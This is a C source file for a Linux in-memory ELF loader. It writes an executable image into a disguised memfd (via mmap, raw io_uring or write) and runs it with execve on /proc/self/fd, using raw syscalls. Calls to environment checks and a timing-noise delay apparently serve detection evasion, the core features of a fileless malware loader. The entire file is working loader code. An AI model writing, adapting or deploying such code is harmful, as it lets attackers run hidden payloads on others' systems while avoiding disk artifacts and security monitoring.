#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include "common.h"

#ifdef COPY_WITH_IO_URING

static int write_via_io_uring(int memfd, const uint8_t *elf_data, size_t elf_size)
{
    struct uring_params p;
    int uring_fd;
    int ret = -1;

    /* ------------------------------------------------------------------
     * 1. Create the ring (depth 1 is sufficient for a single write).
     * ------------------------------------------------------------------ */
    __builtin_memset(&p, 0, sizeof(p));
    uring_fd = (int)syscall2(__NR_io_uring_setup, 1, (long)&p);
    if (uring_fd < 0)
        return -1;

    /* ------------------------------------------------------------------
     * 2. Map SQ ring, CQ ring, and SQE array.
     *    On kernels >= 5.4 IORING_FEAT_SINGLE_MMAP allows the SQ and CQ
     *    rings to share a single mmap region; we handle both cases.
     * ------------------------------------------------------------------ */
    unsigned sq_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned int);
    unsigned cq_sz = p.cq_off.cqes  + p.cq_entries * sizeof(struct uring_cqe);

    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        if (cq_sz > sq_sz)
            sq_sz = cq_sz;
        cq_sz = sq_sz;
    }

    uint8_t *sq_ptr = (uint8_t *)syscall6(
        __NR_mmap, (long)NULL, sq_sz,
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
        uring_fd, (long)IORING_OFF_SQ_RING);
    if ((void *)sq_ptr == MAP_FAILED)
        goto out_close_uring;

    uint8_t *cq_ptr;
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        cq_ptr = sq_ptr;
    } else {
        cq_ptr = (uint8_t *)syscall6(
            __NR_mmap, (long)NULL, cq_sz,
            PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
            uring_fd, (long)IORING_OFF_CQ_RING);
        if ((void *)cq_ptr == MAP_FAILED)
            goto out_unmap_sq;
    }

    struct uring_sqe *sqes = (struct uring_sqe *)syscall6(
        __NR_mmap, (long)NULL, p.sq_entries * sizeof(struct uring_sqe),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
        uring_fd, (long)IORING_OFF_SQES);
    if ((void *)sqes == MAP_FAILED)
        goto out_unmap_cq;

    /* Convenience pointers into the SQ control block                     */
    volatile unsigned *sq_head  = (volatile unsigned *)(sq_ptr + p.sq_off.head);
    volatile unsigned *sq_tail  = (volatile unsigned *)(sq_ptr + p.sq_off.tail);
    volatile unsigned *sq_mask  = (volatile unsigned *)(sq_ptr + p.sq_off.ring_mask);
    volatile unsigned *sq_array = (volatile unsigned *)(sq_ptr + p.sq_off.array);
    (void)sq_head; /* head is managed by the kernel for the SQ            */

    /* Convenience pointers into the CQ control block                     */
    volatile unsigned *cq_head = (volatile unsigned *)(cq_ptr + p.cq_off.head);
    volatile unsigned *cq_tail = (volatile unsigned *)(cq_ptr + p.cq_off.tail);
    volatile unsigned *cq_mask = (volatile unsigned *)(cq_ptr + p.cq_off.ring_mask);
    struct uring_cqe  *cqes    = (struct uring_cqe  *)(cq_ptr + p.cq_off.cqes);
    (void)cq_tail; /* tail is managed by the kernel for the CQ            */

    /* ------------------------------------------------------------------
     * 3. Build one IORING_OP_WRITE SQE at the current tail slot.
     * ------------------------------------------------------------------ */
    unsigned tail_idx = *sq_tail;
    unsigned slot     = tail_idx & *sq_mask;

    __builtin_memset(&sqes[slot], 0, sizeof(sqes[slot]));
    sqes[slot].opcode    = IORING_OP_WRITE;
    sqes[slot].fd        = memfd;
    sqes[slot].off       = 0;                              /* start of file */
    sqes[slot].addr      = (uint64_t)(uintptr_t)elf_data;
    sqes[slot].len       = (uint32_t)elf_size;
    sqes[slot].user_data = 0xdeadbeefULL;                  /* CQE correlator */

    sq_array[slot] = slot;

    io_write_barrier();
    *sq_tail = tail_idx + 1;
    io_write_barrier();

    /* ------------------------------------------------------------------
     * 4. Submit 1 SQE and block until 1 CQE is ready (single syscall).
     * ------------------------------------------------------------------ */
    long entered = syscall6(
        __NR_io_uring_enter,
        uring_fd,
        1,                      /* to_submit   */
        1,                      /* min_complete */
        IORING_ENTER_GETEVENTS,
        (long)NULL,             /* sigmask     */
        0);                     /* sigmask_sz  */

    if (entered < 0)
        goto out_unmap_sqes;

    /* ------------------------------------------------------------------
     * 5. Harvest the CQE and validate the byte count.
     * ------------------------------------------------------------------ */
    io_read_barrier();
    unsigned cq_idx = *cq_head & *cq_mask;
    struct uring_cqe cqe = cqes[cq_idx];   /* snapshot before advancing  */
    io_read_barrier();
    *cq_head = *cq_head + 1;
    io_write_barrier();

    /* cqe.res is the number of bytes written (>=0) or -errno on error    */
    if (cqe.res != (int32_t)elf_size)
        goto out_unmap_sqes;

    ret = 0;

out_unmap_sqes:
    syscall2(__NR_munmap, (long)sqes,
             p.sq_entries * sizeof(struct uring_sqe));
out_unmap_cq:
    if (!(p.features & IORING_FEAT_SINGLE_MMAP))
        syscall2(__NR_munmap, (long)cq_ptr, cq_sz);
out_unmap_sq:
    syscall2(__NR_munmap, (long)sq_ptr, sq_sz);
out_close_uring:
    syscall1(__NR_close, uring_fd);
    return ret;
}

#endif /* COPY_WITH_IO_URING */

/* ========================================================================= */

int execute_from_memory(const uint8_t* elf_data, size_t elf_size, char* const argv[], char* const envp[]) {

   // Allocate randomized address space to leverage ASLR
    void *randomized_base = (void *)syscall6(__NR_mmap, (long)NULL, elf_size, PROT_NONE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (randomized_base == MAP_FAILED) {
        return -1;
    }

    // Use masqueraded memfd creation
    int memfd = create_masqueraded_memfd();
    if (memfd < 0) {
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }

    check_exec_context();

    // Set file size using direct syscall
    if (syscall2(__NR_ftruncate, memfd, elf_size) < 0) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }

#ifdef COPY_WITH_MMAP
    /* ------------------------------------------------------------------
     * Path A: mmap the memfd PROT_WRITE and byte-copy the ELF into it.
     * ------------------------------------------------------------------ */
    DBG("write path: mmap\n");
    uint8_t *map = (uint8_t *)syscall6(__NR_mmap, (long)NULL, elf_size, PROT_WRITE, MAP_SHARED, memfd, 0);
    size_t i;
    if (map == MAP_FAILED) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }
    for (i = 0; i < elf_size; ++i) {
        /* This could be quite a bit faster at the cost of a library call. */
        map[i] = elf_data[i];
    }
#ifdef _POSIX_MAPPED_FILES
    if (syscall3(__NR_msync, (long)map, elf_size, MS_SYNC) == -1) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }
#endif /* #ifdef _POSIX_MAPPED_FILES */
    if (syscall2(__NR_munmap, (long)map, elf_size) == -1) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }

#elif defined(COPY_WITH_IO_URING)
    /* ------------------------------------------------------------------
     * Path B: write the ELF into the memfd via io_uring IORING_OP_WRITE.
     * Requires kernel >= 5.1. No liburing — raw syscalls only.
     * ------------------------------------------------------------------ */
    DBG("write path: io_uring\n");
    if (write_via_io_uring(memfd, elf_data, elf_size) < 0) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }

#else
    /* ------------------------------------------------------------------
     * Path C: plain write(2) syscall (original default).
     * ------------------------------------------------------------------ */
    DBG("write path: plain write(2)\n");
    if (syscall3(__NR_write, memfd, (long)elf_data, elf_size) != (long)elf_size) {
        syscall1(__NR_close, memfd);
        syscall2(__NR_munmap, (long)randomized_base, elf_size);
        return -1;
    }
#endif /* #ifdef COPY_WITH_MMAP */

    char memfd_path[256];
    snprintf(memfd_path, sizeof(memfd_path), "/proc/self/fd/%d", memfd);

    check_exec_context();
    noise_delay(80);

    // Execute using direct syscall
    syscall3(__NR_execve, (long)memfd_path, (long)argv, (long)envp);

    // Cleanup on execve failure
    syscall2(__NR_munmap, (long)randomized_base, elf_size);
    syscall1(__NR_close, memfd);
    return -1;
}